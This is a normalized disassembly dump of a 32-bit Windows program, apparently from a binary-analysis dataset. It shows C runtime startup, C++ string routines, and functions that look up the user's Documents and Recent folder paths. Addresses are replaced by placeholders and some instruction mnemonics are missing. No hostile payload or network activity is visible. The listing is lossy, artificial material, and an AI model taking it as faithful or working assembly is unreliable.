push eax
push rw-data
push rw-data
call esi
lea ecx [ esp + 0xe0 ]
lea edx [ esp + 0xa0 ]
push ecx
push edx
push rw-data
push rw-data
call esi
mov eax [ esp + 0x50 ]
lea ecx [ esp + 0x34 ]
push eax
push rw-data
push ecx
mov [ esp + 0x40 ] ebx
call edi
add esp 0xc
lea edx [ esp + 0xe0 ]
lea eax [ esp + 0x34 ]
push edx
push eax
push rw-data
jmp r-xdata
push rw-data
push rw-data
call esi
mov eax [ esp + 0x64 ]
lea ecx [ esp + 0xe0 ]
cmp eax ebx
push ecx
je r-xdata
lea eax [ esp + 0xe0 ]
push eax
push rw-data
lea edx [ esp + 0xe0 ]
push edx
push rw-data
jmp r-xdata
push rw-data
call esi
cmp [ esp + 0x98 ] ebx
je r-xdata
mov ecx [ esp + 0x28 ]
mov [ esp + 0x18 ] ebx
cmp ecx ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
push rw-data
push rw-data
call esi
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
mov ecx [ esp + 0x7c ]
mov [ esp + 0x28 ] ebx
cmp ecx ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_402730
add esp 0x4
cmp al 0xff
je r-xdata
mov eax 0x1
jmp r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_402730
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov ecx [ esp + 0x5f0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x5ec
retn
dec ecx
push ecx
call sub_402730
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
dec al
mov [ ecx - 0x1 ] al
mov eax 0x1
jmp r-xdata
sub_402490
sub esp 0x210
push ebx
push ebp
push esi
push edi
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x11c ]
xor esi esi
[ edi ]
mov ecx 0x41
lea edi [ esp + 0x18 ]
[ edi ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
push eax
push 0x5
push esi
mov [ esp + 0x1c ] esi
call [ SHGetSpecialFolderLocation@IAT ]
mov eax [ esp + 0x10 ]
cmp eax esi
je r-xdata
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0x8
lea ecx [ esp + 0x18 ]
push ecx
push eax
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x4 ]
cmp ecx esi
je r-xdata
call [ std::_Xlen@IAT ]
lea edx [ esp + 0x11c ]
push 0x104
lea eax [ esp + 0x1c ]
push edx
push eax
call [ GetShortPathNameA@IAT ]
jmp r-xdata
cmp ebx esi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x224 ]
[ edi ]
mov dl [ esp + 0x17 ]
mov [ ebp + 0x4 ] esi
not ecx
dec ecx
mov [ ebp ] dl
mov ebx ecx
mov [ ebp + 0x8 ] esi
cmp ebx 0xfffffffd
mov [ ebp + 0xc ] esi
jbe r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x210
retn
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
cmp eax ebx
jae r-xdata
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
lea esi [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
pop edi
mov [ ebp + 0x8 ] ebx
pop esi
mov [ ebx + ecx ] 0x0
pop ebp
pop ebx
add esp 0x210
retn
push ebx
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Copy@IAT ]
dec al
push esi
mov [ ecx - 0x1 ] al
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x210
retn
sub_4025e0
sub esp 0x210
push ebx
push ebp
push esi
push edi
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x11c ]
xor esi esi
[ edi ]
mov ecx 0x41
lea edi [ esp + 0x18 ]
[ edi ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
push eax
push 0x8
push esi
mov [ esp + 0x1c ] esi
call [ SHGetSpecialFolderLocation@IAT ]
mov eax [ esp + 0x10 ]
cmp eax esi
je r-xdata
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0x8
lea ecx [ esp + 0x18 ]
push ecx
push eax
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x4 ]
cmp ecx esi
je r-xdata
call [ std::_Xlen@IAT ]
lea edx [ esp + 0x11c ]
push 0x104
lea eax [ esp + 0x1c ]
push edx
push eax
call [ GetShortPathNameA@IAT ]
jmp r-xdata
cmp ebx esi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x224 ]
[ edi ]
mov dl [ esp + 0x17 ]
mov [ ebp + 0x4 ] esi
not ecx
dec ecx
mov [ ebp ] dl
mov ebx ecx
mov [ ebp + 0x8 ] esi
cmp ebx 0xfffffffd
mov [ ebp + 0xc ] esi
jbe r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x210
retn
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
cmp eax ebx
jae r-xdata
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
lea esi [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
pop edi
mov [ ebp + 0x8 ] ebx
pop esi
mov [ ebx + ecx ] 0x0
pop ebp
pop ebx
add esp 0x210
retn
push ebx
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Copy@IAT ]
dec al
push esi
mov [ ecx - 0x1 ] al
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x210
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_402947
cmp [ rw-data ] ebx
jne r-xdata
call sub_402932
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_402944
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401080
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401000
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_401020
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_401020
push ??1Init@ios_base@std@@QAE@XZ
call sub_402767
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_401040
call ??0_Winit@std@@QAE@XZ
jmp sub_401060
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_401060
push ??1_Winit@std@@QAE@XZ
call sub_402767
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
sub_401609
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
mov eax r-xdata
retn
cmp [ eax ] 0x0
je r-xdata
call [ GetLastError@IAT ]
sub_401750
retn
sub_401760
mov eax [ esp + 0x4 ]
push eax
call sub_401750
add esp 0x4
xor eax eax
retn 0x4
sub_402730
push [ esp + 0x4 ]
call free
pop ecx
retn
sub_40273b
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_402767
push [ esp + 0x4 ]
call sub_40273b
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_402779
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_402730
pop ecx
??2@YAPAXI@Z
jmp [ operator new@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
free
jmp [ free@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402932
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_402944
xor eax eax
retn
sub_402947
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_402960
mov eax r--data
jmp __CxxFrameHandler
sub_402970
lea ecx [ ebp - 0x584 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40297c
lea ecx [ ebp - 0x5d8 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402988
lea ecx [ ebp - 0x5e8 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402994
lea ecx [ ebp - 0x52c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4029a0
lea ecx [ ebp - 0x52c ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4029ac
mov eax r--data
jmp __CxxFrameHandler
